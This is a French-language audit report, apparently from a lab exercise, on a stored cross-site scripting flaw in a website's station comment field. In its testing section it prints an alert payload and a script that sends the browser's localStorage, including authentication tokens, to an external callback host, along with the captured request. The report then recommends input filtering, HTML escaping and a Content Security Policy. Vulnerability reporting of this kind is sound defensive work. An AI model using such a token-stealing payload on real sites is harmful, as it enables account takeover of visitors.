# 🔒 Rapport d’Audit Cybersécurité — Vulnérabilité XSS

### 🎯 Cible :
Site web — http://10.33.70.223:8000/

### 📅 Date de l’audit :
06/12/2025

### 👨‍💻 Auditeur :
LaDébauche

## 1. 📋 Contexte
Dans le cadre d’un audit de sécurité, nous avons testé toutes les zones de saisie utilisateur du site, notamment le champ commentaire sur les stations. L’objectif était de détecter la présence de vulnérabilités de type Cross-Site Scripting (XSS).

## 2. ⚠️ Description de la vulnérabilité
### Type :
Cross-Site Scripting (XSS) stocké

### Localisation :
Champ commentaire sur les stations

### Détails :
Le champ commentaire n’échappe pas ni ne filtre correctement les entrées. Il est possible d’injecter du code JavaScript qui sera exécuté sur les navigateurs des visiteurs, ce qui constitue un risque majeur.

## 3. 🧪 Tests réalisés
### Test 1 : injection simple
Payload injecté :
```
<script>alert(1)</script>
```
Résultat :
Une alerte s’affiche immédiatement dans le navigateur → preuve que le XSS est exploitable.

### Test 2 : vol de données via XSS
Payload injecté :
```
<script>
fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
</script>
```
Résultat :
Le script vole le contenu complet du localStorage, incluant notamment des tokens d’authentification, et l’envoie vers un serveur externe contrôlé par l’attaquant.

Exemple de requête interceptée :
```bash
GET /capture?ls={"auth_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","auth_user":"{\"id\":\"683d6f786e7170f60e39139e\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"}
Host: d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro

```

## 4. 💥 Impact

🚨 Vol des données sensibles (tokens, identifiants…)

🔓 Prise de contrôle possible des comptes utilisateurs

🦠 Propagation de scripts malveillants (keylogger, redirection, etc.)

📉 Perte de confiance des utilisateurs, risques légaux


## 5. 🛠️ Recommandations & Rémédiations

### 5.1 Validation stricte via regex pour le champ commentaire
Empêcher l’injection de caractères spéciaux utilisés dans XSS :
```
[<>{}()"'/;]
```
Ce filtre bloque les caractères < > { } ( ) " ' / ; qui servent à construire des balises ou scripts malveillants.

### 5.2 Assainissement côté serveur
Nettoyer et encoder les entrées avant affichage.

Utiliser des fonctions d’échappement HTML standards.

### 5.3 Mise en place d’une Content Security Policy (CSP)
Limiter les sources de scripts autorisées pour empêcher l’exécution de scripts externes ou injectés.

### 5.4 Validation côté client (optionnelle mais recommandée)
Améliorer l’expérience utilisateur en détectant les erreurs avant l’envoi.

## 6. ✅ Conclusion
La faille XSS détectée est critique et doit être corrigée rapidement pour protéger les utilisateurs et préserver l’intégrité du site. L’implémentation d’un filtrage rigoureux, couplée à une politique CSP, est indispensable.

